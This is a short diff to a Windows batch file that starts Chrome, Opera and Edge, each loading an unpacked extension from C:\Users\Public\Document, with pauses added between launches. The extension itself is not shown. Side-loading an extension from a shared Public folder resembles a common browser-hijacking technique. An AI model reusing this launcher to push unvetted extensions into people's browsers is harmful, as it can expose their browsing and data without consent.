@@ -1,4 +1,6 @@
 @echo off
-start chrome --load-extension="C:\Users\Public\Document"
+start chrome.exe --load-extension="C:\Users\Public\Document"
+timeout /t 10 /nobreak >nul
 start opera.exe --load-extension="C:\Users\Public\Document"
+timeout /t 10 /nobreak >nul
 start msedge.exe --load-extension="C:\Users\Public\Document"
